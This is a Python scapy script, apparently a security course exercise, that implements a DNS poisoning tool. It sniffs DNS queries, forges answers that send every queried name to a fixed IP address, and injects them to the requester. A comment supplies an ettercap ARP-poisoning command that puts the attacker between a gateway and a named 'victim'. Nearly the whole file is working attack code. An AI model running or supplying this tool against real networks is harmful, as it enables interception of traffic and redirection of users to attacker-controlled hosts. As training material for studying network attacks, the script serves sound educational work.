#!/usr/bin/python
from scapy.all import *

################################################################
# SPSE Module 3. Lesson 8. EX 1                                #
# DNS Poisoning tool. Similar to DNSspoof using scapy          #
################################################################
# This script must receive (capture a DNS request packet, reply to the
# originator with incorrect information, meaning:
# 1. Sniff traffic to capture dnsn requests
# 2. Forge a response packet with some evil info in it
# 3. Verify on the client side
# 
# Inspired by: http://danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/

# Tested with a 3rd device, using ettercap 
# ettercap --iface wlo2 -T -M arp:remote /192.168.1.1// /192.168.1.3//
# Where 192.168.1.1 is the gateway and 192.168.1.3 is the victim     <- This command allows a computer (running ettercap) to create a MiTM to sniff and inject (DNS spoof) traffic

def run_dns_spoof():
  # Sniffing, looking for DNS traffic
  while True:
#    pkts = sniff(iface = 'wlo2', count = 1, filter = 'port 53', prn = lambda x: x.summary())
    pkts = sniff(iface = 'wlo2', count = 1, filter = 'port 53')
    if DNSQR in pkts[0]:
      print '-[Req Detectado]'
      print pkts[0][DNS].qd
      print pkts[0][IP].dst
      # When query detected we will craft a spoofed DNS Response
      if pkts[0][UDP].sport != 53:
        deport = pkts[0][UDP].sport
      else: 
        deport = pkts[0][UDP].dport
      resp = IP(proto = 'udp', src = pkts[0][IP].dst, dst = pkts[0][IP].src, id = pkts[0][IP].id)/\
             UDP(sport = 53, dport = deport) /\
             DNS(id = pkts[0][DNS].id, qr = 1L, opcode ='QUERY', aa = 1L, rd = 1L, ancount = 1, qd = pkts[0][DNS].qd, an=DNSRR(rrname=pkts[0][DNS].qd.qname, ttl = 80, rdata = '167.206.145.40'))
      print '#'*50
      print '-[Req Detectado]'
      print pkts[0].show()
      print '%s' %(resp.show())
      sendp(Ether()/resp, iface = 'wlo2')
      send(resp)
      send(resp)
      send(resp)
      print 'Packet sent'
      print '#'*50
    if DNSRR in pkts[0]:
      print '#'*50
      print '+[Rsp Detectado]'
      print pkts[0].show()
      print '#'*50

def main():
  run_dns_spoof()
  
# Standard Boiler plate
if __name__ == '__main__':
  main()
